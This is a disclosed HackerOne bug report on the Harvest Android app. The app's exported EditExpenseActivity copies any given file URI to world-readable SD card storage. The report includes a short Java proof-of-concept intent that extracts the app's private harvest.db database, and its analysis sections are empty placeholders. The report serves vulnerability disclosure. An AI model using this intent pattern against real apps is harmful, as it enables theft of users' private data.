---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '161710'
original_report_id: '161710'
title: Possible to steal any protected files on Android
weakness: Information Disclosure
team_handle: harvest
created_at: '2016-08-21T01:07:11.918Z'
disclosed_at: '2017-02-09T17:31:50.831Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 32
tags:
- hackerone
- information-disclosure
---

# Possible to steal any protected files on Android

## Metadata

- HackerOne Report ID: 161710
- Weakness: Information Disclosure
- Program: harvest
- Disclosed At: 2017-02-09T17:31:50.831Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi. I have found an issue which allows to retrieve any files from **_/data/data/com.harvestapp/*_** directory. The problem is in exported activity com.harvestapp.app.EditExpenseActivity which accepts URI to a pdf to be processed and saved it on SD Card which is world accessible directory, but in real world it does not validate which file is given, so I can enter any uri and this file will be copied to **_/sdcard/Android/data/com.harvestapp/files/<current time stamp>.pdf_**

Here is a PoC of stealing **_/data/data/com.harvestapp/databases/harvest.db_**

Code of the malware app:
```java
        Intent intent = new Intent("android.intent.action.SEND");
        intent.setClassName("com.harvestapp", "com.harvestapp.app.EditExpenseActivity");
        intent.setType("application/pdf");
        intent.putExtra("android.intent.extra.STREAM", Uri.parse("file:///data/data/com.harvestapp/databases/harvest.db"));
        startActivity(intent);
```

Screenshots of results are attached

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
